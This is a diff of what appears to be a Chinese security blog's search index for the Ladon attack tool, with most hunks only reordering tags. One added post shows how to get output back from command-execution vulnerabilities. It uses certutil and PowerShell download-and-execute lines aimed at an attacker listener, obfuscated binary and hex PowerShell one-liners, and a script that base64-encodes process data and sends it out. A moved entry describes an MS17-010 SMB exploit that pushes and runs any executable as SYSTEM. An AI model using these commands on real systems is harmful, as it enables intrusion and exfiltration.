@@ -1004,8 +1004,8 @@
         <category>Ladon</category>
       </categories>
       <tags>
-        <tag>Ladon</tag>
         <tag>Tool</tag>
+        <tag>Ladon</tag>
       </tags>
   </entry>
   <entry>
@@ -1306,6 +1306,41 @@ window.location.href="http://k8gege.org/Ladon/LadonGo.html";
       </categories>
       <tags>
         <tag>LadonGo</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>命令执行漏洞Ladon回显之PowerShell篇</title>
+    <url>/p/cve-2018-14847.html</url>
+    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>很多时候命令回显漏洞由于一些特殊原因，无法构造或不方便构造回显，上回讲到JAVA反序列化漏洞Ladon回显方法（<a href="http://k8gege.org/Ladon/web_javarce.html）。本文针对Windows系统实现命令执行漏洞回显方法，使用系统自带certutil或Powershell命令，虽说JAVA跨平台但并不代表所有系统都预装有JAVA，实际上.NET一样是跨平台的，前提都要系统安装才可以，那么对于未安装JAVA的机器或非JAVA程序产生的命令执行漏洞，如何实现命令回显，将是本文讲述的重点。">http://k8gege.org/Ladon/web_javarce.html）。本文针对Windows系统实现命令执行漏洞回显方法，使用系统自带certutil或Powershell命令，虽说JAVA跨平台但并不代表所有系统都预装有JAVA，实际上.NET一样是跨平台的，前提都要系统安装才可以，那么对于未安装JAVA的机器或非JAVA程序产生的命令执行漏洞，如何实现命令回显，将是本文讲述的重点。</a></p>
+<h3 id="启动WEB"><a href="#启动WEB" class="headerlink" title="启动WEB"></a>启动WEB</h3><p>Ladon web 800</p>
+<p>PS: 建议使用8.1以后版本，以免netstat -an等长度过长结果无法接收</p>
+<h3 id="浏览器回显"><a href="#浏览器回显" class="headerlink" title="浏览器回显"></a>浏览器回显</h3><p>直接执行PS1，或向浏览器访问即可看琶Ladon回显BASE64解密结果，就是说我们只要通过命令行发送HTTP请求即可在Ladon控制台看到命令执行后的结果。getstr为发送明文，但是结果中有特殊字符或换行就无法HTTP请求了，所以我们使用BASE64加密，这个原理我们在JAVA反序列化漏洞回显中有提到过。</p>
+<p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/Ladon8.1_web_echo.PNG"></p>
+<h3 id="certutill回显"><a href="#certutill回显" class="headerlink" title="certutill回显"></a>certutill回显</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://192.168.1.43:800/getstr/cve2020</span><br></pre></td></tr></table></figure>
+
+<h3 id="PowerShell回显"><a href="#PowerShell回显" class="headerlink" title="PowerShell回显"></a>PowerShell回显</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">powershell -nop -c <span class="string">"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.131:800/debase64/MTIzMTIzMTIzMTIzMTI=')"</span></span><br></pre></td></tr></table></figure>
+
+<p>执行以上命令，可以在Ladon中得到回显，但是实战中，我们不可能未补先知，直接能返回结果，所以得先执行命令，获取结果转成BASE64后再发送给Ladon解密，所以我们接下来要研究，如何通过powershell执行任意命令并加密发送给Ladon</p>
+<h3 id="查看进程例子"><a href="#查看进程例子" class="headerlink" title="查看进程例子"></a>查看进程例子</h3><h4 id="test-ps1"><a href="#test-ps1" class="headerlink" title="test.ps1"></a>test.ps1</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$info</span>=<span class="built_in">get-process</span>;</span><br><span class="line">echo <span class="variable">$info</span>;</span><br></pre></td></tr></table></figure>
+
+<p>使用LadonGUI版的编码转换功能将代码转成一行CMD命令，因为命令执行漏洞一般不支持执行多行PS1脚本，经过转换后可以得到命令执行漏洞通用的一行CMD命令。测试发现可以使用Binary或hex等加密将PowerShell代码转成一条命令，以便结合漏洞使用</p>
+<h4 id="Ladon-Base64Command失败"><a href="#Ladon-Base64Command失败" class="headerlink" title="Ladon Base64Command失败"></a>Ladon Base64Command失败</h4><p>提示 =get-process : The term ‘=get-process’ is not recognized as the name of a</p>
+<h4 id="Ladon-Binary成功"><a href="#Ladon-Binary成功" class="headerlink" title="Ladon Binary成功"></a>Ladon Binary成功</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">powershell  -NoP  -NonIntera   <span class="string">"[stRinG]::join( '', ( ( 100100 , 1101001,1101110 , 1100110 ,1101111 , 111101 ,1100111,1100101, 1110100, 101101,1110000,1110010 ,1101111, 1100011,1100101,1110011,1110011 , 111011,1101 ,1010,1100101, 1100011,1101000 ,1101111 ,100000,100100,1101001 , 1101110 ,1100110 ,1101111 ,111011)|fOreAcH-objEct&#123;([convERT]::ToInT16((<span class="variable">$_</span>.TOstRInG()),2) -as [CHAr])&#125;) )| &amp; ((VaRIABle '*MDr*').nAme[3,11,2]-JoIn'')"</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Ladon-hex成功"><a href="#Ladon-hex成功" class="headerlink" title="Ladon hex成功"></a>Ladon hex成功</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">powershell   -NonInteract  -NoProfi     <span class="string">"('24S69k6e!66!6f!3dU67!65h74-2dS70S72O6f;63O65k73S73;3b;d!a-65-63!68;6f!20k24h69;6ek66h6fU3b'.sPLIt( 'UOh-;!kS' ) | FOreaCh-objECt&#123; ( [chAR]( [cONVerT]::TOInt16( ( [STRinG]<span class="variable">$_</span> ) ,16))) &#125; ) -JOiN '' | . ( <span class="variable">$eNv</span>:comSPeC[4,15,25]-JoiN'')"</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="查看进程信息"><a href="#查看进程信息" class="headerlink" title="查看进程信息"></a>查看进程信息</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$info</span>=<span class="built_in">get-process</span></span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$env:username</span></span><br><span class="line">echo <span class="variable">$info</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$bytes</span>  = [<span class="type">System.Text.Encoding</span>]::UTF8.GetBytes(<span class="variable">$info</span>)</span><br><span class="line"><span class="variable">$b64</span> = [<span class="type">System.Convert</span>]::ToBase64String(<span class="variable">$bytes</span>)</span><br><span class="line">echo <span class="variable">$b64</span>.Replace(<span class="string">"="</span>,<span class="string">"%3d"</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">$webClient</span> = <span class="built_in">New-Object</span> System.Net.WebClient</span><br><span class="line"><span class="variable">$webClient</span>.DownloadString(<span class="string">'http://192.168.1.18:800/debase64/'</span>+<span class="variable">$b64</span>)</span><br></pre></td></tr></table></figure>
+
+<p>PS：查看其它命令，可以自行修改</p>
+<p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/Ladon8.1_ps1_hex.PNG"></p>
+<h3 id="Download"><a href="#Download" class="headerlink" title="Download"></a>Download</h3><h4 id="LadonGo-ALL-OS"><a href="#LadonGo-ALL-OS" class="headerlink" title="LadonGo (ALL OS)"></a>LadonGo (ALL OS)</h4><p><a href="https://github.com/k8gege/LadonGo/releases" target="_blank" rel="noopener">https://github.com/k8gege/LadonGo/releases</a></p>
+<h4 id="Ladon-Windows-amp-Cobalt-Strike"><a href="#Ladon-Windows-amp-Cobalt-Strike" class="headerlink" title="Ladon (Windows &amp; Cobalt Strike)"></a>Ladon (Windows &amp; Cobalt Strike)</h4><p>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>8.1版本：K8小密圈</p>
+]]></content>
+      <categories>
+        <category>Ladon</category>
+      </categories>
+      <tags>
+        <tag>命令执行</tag>
       </tags>
   </entry>
   <entry>
@@ -3202,8 +3237,8 @@ WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre>
         <category>嗅探</category>
       </categories>
       <tags>
-        <tag>Ladon</tag>
         <tag>Tool</tag>
+        <tag>Ladon</tag>
         <tag>Sniffer</tag>
         <tag>FtpSniffer</tag>
         <tag>HttpSniffer</tag>
@@ -3532,8 +3567,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
         <category>Ladon</category>
       </categories>
       <tags>
-        <tag>Ladon</tag>
         <tag>Tool</tag>
+        <tag>Ladon</tag>
       </tags>
   </entry>
   <entry>
@@ -3791,12 +3826,12 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 ]]></content>
       <categories>
         <category>Ladon</category>
-        <category>Kali</category>
         <category>密码</category>
+        <category>Kali</category>
       </categories>
       <tags>
-        <tag>Ladon</tag>
         <tag>Tool</tag>
+        <tag>Ladon</tag>
         <tag>Kali</tag>
         <tag>Scanner</tag>
       </tags>
@@ -4014,8 +4049,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
         <category>Kali</category>
       </categories>
       <tags>
-        <tag>Ladon</tag>
         <tag>Tool</tag>
+        <tag>Ladon</tag>
         <tag>Kali</tag>
         <tag>Scanner</tag>
       </tags>
@@ -4100,8 +4135,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
         <category>Cobalt Strike</category>
       </categories>
       <tags>
-        <tag>Ladon</tag>
         <tag>Tool</tag>
+        <tag>Ladon</tag>
         <tag>Cobalt Strike</tag>
       </tags>
   </entry>
@@ -4144,13 +4179,13 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <p><a href="https://github.com/k8gege/K8tools/raw/master/Comahawk.rar" target="_blank" rel="noopener">https://github.com/k8gege/K8tools/raw/master/Comahawk.rar</a></p>
 ]]></content>
       <categories>
-        <category>Exp</category>
         <category>提权</category>
+        <category>Exp</category>
       </categories>
       <tags>
-        <tag>Exp</tag>
         <tag>Tool</tag>
         <tag>LPE</tag>
+        <tag>Exp</tag>
       </tags>
   </entry>
   <entry>
@@ -4271,9 +4306,9 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
         <category>Ladon</category>
       </categories>
       <tags>
+        <tag>Tool</tag>
         <tag>Exp</tag>
         <tag>Ladon</tag>
-        <tag>Tool</tag>
         <tag>GetShell</tag>
         <tag>ActiveMQ</tag>
         <tag>CVE-2016-3088</tag>
@@ -4295,9 +4330,9 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
         <category>Ladon</category>
       </categories>
       <tags>
+        <tag>Tool</tag>
         <tag>Exp</tag>
         <tag>Ladon</tag>
-        <tag>Tool</tag>
         <tag>GetShell</tag>
         <tag>ThinkPHP</tag>
       </tags>
@@ -4320,9 +4355,9 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
         <category>Ladon</category>
       </categories>
       <tags>
+        <tag>Tool</tag>
         <tag>Exp</tag>
         <tag>Ladon</tag>
-        <tag>Tool</tag>
         <tag>GetShell</tag>
         <tag>PhpStudy</tag>
       </tags>
@@ -4351,9 +4386,9 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
         <category>Ladon</category>
       </categories>
       <tags>
+        <tag>Tool</tag>
         <tag>Exp</tag>
         <tag>Ladon</tag>
-        <tag>Tool</tag>
         <tag>GetShell</tag>
         <tag>PhpStudy</tag>
       </tags>
@@ -4485,8 +4520,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
         <category>PowerShell</category>
       </categories>
       <tags>
-        <tag>Ladon</tag>
         <tag>Tool</tag>
+        <tag>Ladon</tag>
         <tag>PowerShell</tag>
       </tags>
   </entry>
@@ -4528,9 +4563,9 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
         <category>工具</category>
       </categories>
       <tags>
+        <tag>Exp</tag>
         <tag>Apache</tag>
         <tag>Solr</tag>
-        <tag>Exp</tag>
         <tag>Ladon</tag>
         <tag>0day</tag>
       </tags>
@@ -4814,8 +4849,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
         <category>Kali</category>
       </categories>
       <tags>
-        <tag>Ladon</tag>
         <tag>Tool</tag>
+        <tag>Ladon</tag>
         <tag>Kali</tag>
         <tag>Scanner</tag>
       </tags>
@@ -4977,9 +5012,9 @@ Microsoft Windows 10 for 32-bit Systems 0
         <category>工具</category>
       </categories>
       <tags>
-        <tag>Exp</tag>
         <tag>Tool</tag>
         <tag>LPE</tag>
+        <tag>Exp</tag>
       </tags>
   </entry>
   <entry>
@@ -5072,8 +5107,8 @@ Microsoft Windows 10 for 32-bit Systems 0
         <category>工具</category>
       </categories>
       <tags>
-        <tag>Exp</tag>
         <tag>Tool</tag>
+        <tag>Exp</tag>
         <tag>Struts2</tag>
         <tag>GetShell</tag>
       </tags>
@@ -5090,8 +5125,8 @@ Microsoft Windows 10 for 32-bit Systems 0
         <category>工具</category>
       </categories>
       <tags>
-        <tag>Exp</tag>
         <tag>Tool</tag>
+        <tag>Exp</tag>
       </tags>
   </entry>
   <entry>
@@ -5168,8 +5203,8 @@ Microsoft Windows 10 for 32-bit Systems 0
         <category>Python</category>
       </categories>
       <tags>
-        <tag>Ladon</tag>
         <tag>Tool</tag>
+        <tag>Ladon</tag>
         <tag>Python</tag>
       </tags>
   </entry>
@@ -5328,33 +5363,6 @@ ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
       </tags>
   </entry>
   <entry>
-    <title>SMB溢出工具加强版</title>
-    <url>/p/68a8bf1b.html</url>
-    <content><![CDATA[<p><strong>工具:</strong>k8加强版zzz</p>
-<p><strong>编译:</strong>python</p>
-<p><strong>漏洞:</strong>MS17-010</p>
-<p><strong>用法:</strong></p>
-<p>zzz_exploit.exe 192.11.22.82<br>zzz_exploit.exe 192.11.22.82 exe参数<br>zzz_exploit.exe 192.11.22.82 exe参数 管道名</p>
-<p>如exe启动参数为&nbsp; m.exe -Start 实战命令为 zzz_exploit.exe 192.11.22.82 -Start</p>
-<p><strong>内网批量</strong></p>
-<p>可结合cping批量溢出内网,将名称改为smbcheck即可,但exe必须使用无参版。（其它工具也可以，提供个IP参数即可）</p>
-<p>因为cping只会传IP进去,不会传其它参数。使用前需将任意exe改名为ma.dat</p>
-<p>溢出成功会自动将exe传入目标机器，并以system权限启动exe程序。</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/k8zzz.png"></p>
-<p>&nbsp;</p>
-<p>链接: <a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/blob/master/k8zzz.rar</a></p>]]></content>
-      <categories>
-        <category>Exp</category>
-        <category>提权</category>
-      </categories>
-      <tags>
-        <tag>Exp</tag>
-        <tag>Tool</tag>
-        <tag>MS17010</tag>
-        <tag>SMB</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CVE-2019-0604 SharePoint GetShell Exploit</title>
     <url>/p/e896a7d1.html</url>
     <content><![CDATA[<p><span style="font-size: 18px;"><strong>漏洞信息</strong></span></p>
@@ -5447,10 +5455,37 @@ payload5='\x23\x64\x61\x74\x65\x3A\x20\x32\x30\x31\x39\x30\x36\x32\x36\x20\x23\x
         <category>工具</category>
       </categories>
       <tags>
-        <tag>Exp</tag>
         <tag>Tool</tag>
+        <tag>Exp</tag>
         <tag>Code</tag>
         <tag>GetShell</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SMB溢出工具加强版</title>
+    <url>/p/68a8bf1b.html</url>
+    <content><![CDATA[<p><strong>工具:</strong>k8加强版zzz</p>
+<p><strong>编译:</strong>python</p>
+<p><strong>漏洞:</strong>MS17-010</p>
+<p><strong>用法:</strong></p>
+<p>zzz_exploit.exe 192.11.22.82<br>zzz_exploit.exe 192.11.22.82 exe参数<br>zzz_exploit.exe 192.11.22.82 exe参数 管道名</p>
+<p>如exe启动参数为&nbsp; m.exe -Start 实战命令为 zzz_exploit.exe 192.11.22.82 -Start</p>
+<p><strong>内网批量</strong></p>
+<p>可结合cping批量溢出内网,将名称改为smbcheck即可,但exe必须使用无参版。（其它工具也可以，提供个IP参数即可）</p>
+<p>因为cping只会传IP进去,不会传其它参数。使用前需将任意exe改名为ma.dat</p>
+<p>溢出成功会自动将exe传入目标机器，并以system权限启动exe程序。</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/k8zzz.png"></p>
+<p>&nbsp;</p>
+<p>链接: <a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/blob/master/k8zzz.rar</a></p>]]></content>
+      <categories>
+        <category>提权</category>
+        <category>Exp</category>
+      </categories>
+      <tags>
+        <tag>Tool</tag>
+        <tag>Exp</tag>
+        <tag>MS17010</tag>
+        <tag>SMB</tag>
       </tags>
   </entry>
   <entry>
@@ -5605,8 +5640,8 @@ xxe_data = r"""&lt;!DOCTYPE Autodiscover [
         <category>Ladon</category>
       </categories>
       <tags>
-        <tag>Exp</tag>
         <tag>Tool</tag>
+        <tag>Exp</tag>
         <tag>GetShell</tag>
         <tag>Zimbra</tag>
       </tags>
@@ -5629,8 +5664,8 @@ xxe_data = r"""&lt;!DOCTYPE Autodiscover [
         <category>工具</category>
       </categories>
       <tags>
-        <tag>Exp</tag>
         <tag>Tool</tag>
+        <tag>Exp</tag>
         <tag>BypassUAC</tag>
       </tags>
   </entry>
@@ -5700,8 +5735,8 @@ exploit(dip, dport, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;)</cod
         <category>工具</category>
       </categories>
       <tags>
-        <tag>Exp</tag>
         <tag>Tool</tag>
+        <tag>Exp</tag>
         <tag>GetShell</tag>
         <tag>Weblogic</tag>
       </tags>
@@ -5727,9 +5762,9 @@ exploit(dip, dport, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;)</cod
         <category>工具</category>
       </categories>
       <tags>
-        <tag>Exp</tag>
         <tag>Tool</tag>
         <tag>LPE</tag>
+        <tag>Exp</tag>
         <tag>IIS</tag>
       </tags>
   </entry>
